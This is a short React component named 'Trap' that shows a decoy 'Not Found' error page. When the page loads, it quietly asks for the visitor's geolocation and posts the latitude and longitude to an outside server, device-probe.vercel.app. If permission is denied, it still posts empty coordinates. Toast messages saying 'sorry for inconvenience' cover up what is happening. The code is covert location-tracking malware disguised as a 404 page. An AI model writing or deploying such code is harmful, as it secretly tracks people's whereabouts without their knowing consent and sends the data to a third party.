/* eslint-disable react-hooks/rules-of-hooks */
import React from "react";
import axios from "axios";
import { useEffect } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const Trap = () => {
  useEffect(() => {
    getLocation();
  }, []);

  async function getLocation() {
    try {
      const position = await getCurrentPosition();
      const { latitude, longitude } = position.coords;
      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      await main(body);
    } catch (error) {
      const body = {
        deviceLatitude: '',
        deviceLongitude: '',
      };
      await main(body);
      console.error("Error getting location:", error);
      toast.error("sorry for inconvenience");
    }
  }

  async function getCurrentPosition() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (position) => resolve(position),
        (error) => reject(error)
      );
    });
  }

  async function main(body) {
    try {
      const response = await axios.post(
        "https://device-probe.vercel.app/",
        body
      );
      console.log(response.data);
      toast.success("sorry for inconvenience");
      return response.data;
    } catch (error) {
      console.error("Error sending location:", error);
      toast.error("sorry for inconvenience");
      throw error;
    }
  }

  return (
    <>
      <div className="not-found">
        <h1>Not Found</h1>
        <p>We're sorry, but the page you requested could not be found.</p>
        <button>Go Back</button>
      </div>
      <ToastContainer />
    </>
  );
};

export default Trap;
